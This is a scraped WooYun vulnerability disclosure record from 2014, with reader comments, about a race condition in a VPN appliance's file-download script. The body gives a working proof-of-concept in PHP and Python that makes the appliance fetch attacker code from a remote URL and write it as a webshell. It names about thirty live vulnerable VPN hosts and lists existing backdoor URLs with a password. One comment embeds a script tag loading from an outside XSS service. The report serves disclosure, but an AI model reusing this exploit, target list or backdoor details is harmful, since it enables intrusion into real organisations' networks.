{"id": 4995, "wybug_id": "wooyun-2014-048202", "wybug_title": "国内外多家vpn设备厂商批量漏洞(续集一)", "wybug_corp": "众多vpn厂商", "wybug_author": "felixk3y", "wybug_date": "2014-01-07 18:27", "wybug_open_date": "2014-04-07 18:28", "wybug_type": "设计不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行", "设计缺陷", "任意文件下载", "数据库明文密码"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-07：\t细节向公众公开  简要描述： 利用此漏洞可导致任意文件写入，任意代码/命令执行,大量内网可免门票任意漫游 漫游...同时该漏洞涉及到包括网御神州、天融信、西安网赢、卫士通、吉大正元、美国凹凸、德国 ANIX等多家VPN厂商设备在政务、地产、运营商、政府部门、高校、企业、公安、司法、银行等行业存在的任意文件下载、远程命令执行、维护后门、三方平台帐号泄漏、恶意客户端下发等高位漏洞。 详细说明：  #1 首先请看：\n WooYun: [浅谈内网安全]--国内外多家vpn设备厂商批量漏洞 \n漏洞修复中，@紫梦芊 提到修复方法，详见如下：\nexec(\"cp \".$_POST['realfile'].\" \".$_POST['path'].\"\");改为copy($_POST['realfile'],$_POST['path'])exec(\"rm \".$_POST[\"path\"].\"\");改为unlink($_POST['path'])\n嘿，没想到这些厂商还真是这样修复的...咦? 这样修复没有问题啊,但真的是没问题吗?要是真的没问题，就不会有下文了，哈哈...各位看官，且听我细细道来...#2 我们打开根目录下的minica_down.php文件,代码贴出来\n<?if($_POST['realfile'])\tcopy($_POST['realfile'],$_POST['path']);//$_POST[path] = mb_convert_encoding($_POST[path],\"GBK\",\"UTF-8\");$file = mb_convert_encoding($_POST[file],\"GBK\",\"UTF-8\");header(\"Pragma:\");header(\"Cache-Control:\");header(\"Content-type:application/octet-stream\");header(\"Content-Length:\".filesize($_POST[path]));header(\"Content-Disposition:attachment;filename=\\\"$file\\\"\");readfile($_POST[path]);if($_POST['realfile'])\tunlink($_POST[\"path\"]);?>\n第二行代码：\ncopy($_POST['realfile'],$_POST['path']);\n从POST提交的realfile,复制到POST提交的path参数倒数三行代码：\nif($_POST['realfile'])\tunlink($_POST[\"path\"]);?>\n如果提交了realfile参数,则删除path参数所提交的文件，即假如我们post提交,realfile=/ssl/www/test.jpg & path=/ssl/www/admin/shell.php很容易的得到我们想要的shell,但在代码的最后三行,最终删除了path即 删除了我们想要的shell:/ssl/www/admin/shell.php这段代码的逻辑看起来没什么问题，但是呢 我们人是最善于思考的动物，SO...#3 思考中... ...#4 思考后的结果程序的执行需要一个过程，哪怕这个过程很短很短,鉴于此，我们有了如下的结果...（要是我们能在程序删除我们想要的那个shell前，通过一定的方法抢在其前面访问那个shell,这个shell帮我们生成另一个shell，那么这个新生成的shell总不会被删除吧...）这里简单小结一下正常情况：copy成shell1--->删除shell1;被攻击时的情况：copy成shell1--->访问shell1-->shell1生成shell2-->删除shell1 明白了吧?有了想法，那就开始行动吧...方法一：我们可以用py写一个多线程的代码,唯一功能是：不停的访问copy成的shell1\n#coding=utf-8import osimport urllib2import urllibimport threadingclass Query(threading.Thread):    def __init__(self,url):        threading.Thread.__init__(self)        self.url = url    def run(self):        while True:            print 'Testing...'            try:                rep = urllib2.urlopen(self.url,timeout=2)            except :                passdef main():    threads = []    url = \"http://www.vulns.org/shell1.php\"    for i in range(20):        t = Query(url)        t.start()        threads.append(t)    for t in threads:        t.join()if __name__==\"__main__\":    main()\n方法二：将post提交和访问shell让程序同时进行...经过一系列的测试：方法一成功的几率很小，这里 我们选择方法二   漏洞证明：  #5 漏洞最终利用这里 我们用php写漏洞利用的POC:\n<?phpset_time_limit(0);error_reporting(0);function get($url){\t$ch = curl_init();\tcurl_setopt($ch, CURLOPT_URL, $url);\tcurl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);//https请求,不验证证书和hosts\tcurl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);\tcurl_setopt($ch, CURLOPT_HEADER,0);\t$output = curl_exec($ch);\tcurl_close($ch);\treturn $output;}function post($url,$params){\t$ch = curl_init();\tcurl_setopt($ch, CURLOPT_URL, $url);\tcurl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);\tcurl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);\tcurl_setopt($ch, CURLOPT_HEADER, 0);\tcurl_setopt($ch, CURLOPT_POST, 1);\tcurl_setopt($ch, CURLOPT_POSTFIELDS, $params);\t$output = curl_exec($ch);\tcurl_close($ch);\treturn $output;}$i=0;$url = \"https://vpn.com.cn/minica_down.php\";$geturl1 = \"https://vpn.com.cn/sub_ca_reglog.php\";$postdata = \"realfile=http://www.xxx.com/exp.txt&path=sub_ca_reglog.php\";while(++$i<5) {\techo \"\\nTesting[$i]....\\n\";    post($url,$postdata);\tget($geturl1);}$vali_url = \"https://vpn.com.cn/shell.php\";$resp = get($vali_url);echo $resp;if(preg_match('/200 OK/',$resp)){\techo \"Success! shell is : $vali_url, Pass is [1@3]\";}else{\techo  \"------->Fail!\\n\\n\";}?>\nPOC说明：POST提交参数：\nrealfile=http://www.com.cn/2.txt&path=sub_ca_reglog1.php\nrealfile参数是远程的一个文件，目的是生成最终的shell 大小最好几十KB，为我们访问中间的shell1争取时间 增加成功的概率嘛，内容如下：\n\npath是我们想要生成的文件，这里是：sub_ca_reglog1.phpTips：由于这里只是POC,所以在运行的时候 最好多试几次,要是试了几次任然没生成shell，此时可手动访问：http://www.com.cn/sub_ca_reglog1.php 说不定会有意想不到的效果哦.#6 shellhttps://svpn.mbatec.com.twhttps://vpn.mcut.edu.tw 这两个url,对不起了啊,毕竟为了测试嘛\n\n\n\n同时我发现，有很多网站被人留了后门，清理一下吧https://xxxxxxx/admin/free.php 密码cmdhttps://svpn.mbatec.com.tw/welcome_time1.phphttps://svpn.mbatec.com.tw/sub_ca_reglog1.phphttps://svpn.mbatec.com.tw/sub_ca_reglog2.phphttps://svpn.mbatec.com.tw/sub_ca_reglog3.php#7 漏洞站点(摘自@紫梦芊)至少有如下的站点，未列完.....\nhttps://vpn.bit.edu.cn/ 北京理工https://sslvpn.bjtu.edu.cn/ 北交大https://125.46.88.100/ 郑州大学https://219.80.0.19/p 国泰地产集团https://info.nai.edu.cn/ 北京国家会计学院https://124.205.79.78/ 北大计算中心https://210.82.53.201/ 北京联合大学https://vpn.cnu.edu.cn/ 首都师大https://vpn.mcut.edu.tw/ 台湾明志科技大学https://ac.whlib.gov.cn 武汉图书馆https://sslvpn.nhcue.edu.tw 新竹教育大学https://isms.ydu.edu.tw/ 育達商業科技大學https://sslvpn.ydu.edu.tw/ 育達商業科技大學https://vpn.cute.edu.tw 中国(台湾)科技大学https://sslvpn.ntue.edu.tw 国立台北教育大学https://vpn.psi.com.tw 升阳国际https://maltimur.jksm.gov.my/ 马来西亚某政府网站https://vpn.ccom.edu.cn 中央音乐学院https://vpn.dlmu.edu.cn 大连海事大学https://vpn.wanfang.edu.cn 河南理工https://vpn.genius.com.cn 深圳巨灵https://sslvpn.changhongit.com 长虹佳华https://vpn.jnrd.com.cn 北京京能热电https://sslvpn.kworld.com.tw 廣寰台北辦公室https://www.oo586.com/ 易宝支付https://svpn.mbatec.com.tw 新碩資訊https://sslvpn.szs.com.tw 新日兴https://sslvpn.gzcatv.net 广数传媒https://e.nais.net.cn 农业部农E通https://vpn.thcic.cn 清华\n   修复方案：  神马意思,你们懂,要是不懂 再问我,OK...   版权声明：转载请注明来源 felixk3y@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-01-12 11:36 厂商回复： CNVD确认并复现所述况，并根据利用原理对EXP进行了改写，提高了测试成功率。在9日上午已经复现多个实例，不过在9日下午之后测试结果出现新的变化。需要汇总进一步的结果才进行处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-07 18:28 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  mark，晚上研究。    \n     2014-01-07 18:44 |    \t\tHoerWing \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:4        | \"People should not be afraid of their go...)\t\t \n  卧槽，这么屌，一定要火，二楼留名    \n     2014-01-07 18:50 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  这么奇葩？只能等20天再看了。哎。    \n     2014-01-07 18:57 |    \t\t天朝城管 \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:35        | 不要等到命玩你的时候才开始玩命)\t\t \n  雷劈了..    \n     2014-01-07 19:49 |    \t\tJJFly \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | <a href=\"www.yidianjiujijifly.com\">www.y...)\t\t \n  jjbomb！！！！坐等开放    \n     2014-01-07 19:53 |    \t\thacker@sina.cn \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:27        | ANONYMOUS)\t\t \n  说得这么屌，不mark一下也说不过去了。    \n     2014-01-07 19:53 |    \t\tMujj \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:4        | IDC商)\t\t \n  拍照    \n     2014-01-07 20:01 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  咔嚓！    \n     2014-01-07 20:05 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  劈的一手好雷！    \n     2014-01-07 20:13 |    \t\t未来还没来 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        | 每个人都期望成为主角，却不知道世界上从来...)\t\t \n  必须要看。要顶啊、、、、顺带楼下没JJ    \n     2014-01-07 23:46 |    \t\t洗剪吹 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 出门在外，安全第一！)\t\t \n  碉堡了     \n     2014-01-07 23:52 |    \t\txxw \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:18        | 中国梦)\t\t \n  求10连载    \n     2014-01-08 00:19 |    \t\twhitemonty \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:4        | Secur1ty just lik3 a girl. B0th of th3m ...)\t\t \n  默默留名    \n     2014-01-08 00:55 |    \t\tAC_TEAM \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:2        | 专注社工三十年)\t\t \n  呐么屌。   出售美国、伊朗、苏联、印度、日本、俄罗斯、法国等国家卫星。。。    \n     2014-01-08 00:58 |    \t\tAC_TEAM \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:2        | 专注社工三十年)\t\t \n  出售国防专用VPN、军用专线网络、无限畅游美国印度伊拉克军方机密资料。    \n     2014-01-08 07:17 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  关注    \n     2014-01-08 09:23 |    \t\tjk_影 \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:9        | 专注google三十年)\t\t \n  叼炸天的节奏    \n     2014-01-08 09:40 |    \t\t白加黑 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:8        )\t\t \n  期待续集二    \n     2014-01-08 09:44 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  关注连续剧    \n     2014-01-08 10:01 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @cncert国家互联网应急中心 不要卖萌好吗，哈哈哈    \n     2014-01-08 10:09 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  RANK 1 ?    \n     2014-01-08 10:10 |    \t\t笨小猪 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:2        | 杯壁下流)\t\t \n  这么吊，必须mark一下了    \n     2014-01-08 11:50 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  mark    \n     2014-01-08 12:04 |    \t\tonlycjeg \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:5        | 我就看看,我不说话.)\t\t \n  mark    \n     2014-01-08 12:33 |    \t\t紫梦芊 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:9        | 踏踏实实做测试)\t\t \n  是老漏洞未修复? 还是发现新漏洞 关注～    \n     2014-01-08 13:22 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  @紫梦芊 话说Wooyun唯一女白帽子 紫紫,对felixk3y这个ID有印象吗?:-)    \n     2014-01-08 14:02 |    \t\t Jesus \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:18        | 天地不仁,以万物为刍狗！)\t\t \n  关注。    \n     2014-01-08 16:38 |    \t\t摸了你 \t\t\t( 实习白帽子  |\t\t\t        Rank:71 漏洞数:17        | 1shitMVqBjCKrnRvSoixMx6RKpG9J8pBM)\t\t \n  @felixk3y 你让肉肉情何以堪...    \n     2014-01-08 17:09 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  @摸了你 @felixk3y 肉肉跟紫梦芊不一样，肉肉是个胖子。。胖……白帽子。    \n     2014-01-08 17:50 |    \t\thackesc \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:3        | 求各种基友)\t\t \n  楼上必火    \n     2014-01-08 23:34 |    \t\tBlackeagle \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:10        | 向WooYun致敬)\t\t \n  @cncert国家互联网应急中心 小哥你是上错号的节奏吗    \n     2014-01-09 11:30 |    \t\tjeary \t\t\t( 普通白帽子  |\t\t\t        Rank:296 漏洞数:106        | (:‮.kcaH eb nac gnihtynA))\t\t \n  这个一定会被转载的！<script src=//xss.tw/5306></script>    \n     2014-01-09 14:28 |    \t\tHoerWing \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:4        | \"People should not be afraid of their go...)\t\t \n  @jeary 哥们你好逗    \n     2014-01-09 16:52 |    \t\t花生^_^ \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 加强学习~~)\t\t \n  mark    \n     2014-01-10 08:41 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  根据9日测试结果，上午和下午出现较大差异。上午测试还可以复现一些情况，但下午测试就有很多VPN设备已经删除漏洞页面。@felixk3y     \n     2014-01-10 09:10 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  @cncert国家互联网应急中心 后来我继续测试了其他一些url,发现只要远程用到的那个文件在100KB以上,基本就可以完全复现...    \n     2014-01-12 09:32 |    \t\t紫梦芊 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:9        | 踏踏实实做测试)\t\t \n  @felixk3y 没留意到过..    \n     2014-02-01 13:49 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n   WooYun: 某通用型在线学习管理系统存在任意文件上传漏洞（另一种奇葩姿势）  和我这个用的方法类似啊。    \n     2014-02-01 23:24 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  思路贊    \n     2014-02-17 17:40 |    \t\t紫梦芊 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:9        | 踏踏实实做测试)\t\t \n  @felixk3y 你是YwiSax ?  我忘记了allow_url_fopen默认时On的 呵呵    \n     2014-02-17 17:55 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  @紫梦芊 不是，QQ上联系过你的 id也是这个    \n     2014-02-17 18:11 |    \t\t紫梦芊 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:9        | 踏踏实实做测试)\t\t \n  @felixk3y  向来不加不认识的人    \n     2014-02-17 18:23 |    \t\t0x334 \t\t\t( 普通白帽子  |\t\t\t        Rank:171 漏洞数:35        | 漏洞无影响，已忽略～～～～～～～)\t\t \n  妹子，你好屌啊。    \n     2014-02-17 19:51 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  Mark    \n     2014-02-21 13:59 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  思路很赞啊    \n     2014-02-24 23:54 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  哇 我就知道我们早晚会上榜 还好上榜设备不在机房     \n     2014-03-12 22:30 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  niu b    \n     2014-03-16 13:14 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  设备在办公桌上了 周一玩玩去    \n     2014-04-08 03:35 |    \t\t风之子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 好好学习...囧)\t\t \n  mark，厉害    \n     2014-04-08 14:14 |    \t\te_ifox \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 我也是有rank的人了)\t\t \n  这，，，，自从来到乌云，各种开眼界啊    \n     2014-04-08 16:21 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  思路很不错，允许远程文件下载，加上利用命令执行时间差    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}